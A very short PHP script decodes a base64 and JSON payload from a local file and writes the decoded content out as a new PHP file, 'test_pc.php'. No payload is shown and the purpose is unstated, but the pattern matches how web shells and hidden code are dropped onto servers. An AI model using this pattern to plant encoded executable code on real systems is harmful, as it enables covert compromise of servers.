<?php
$p = json_decode(base64_decode(file_get_contents('payload_satuan.txt')), true);
file_put_contents('test_pc.php', base64_decode($p['c']));
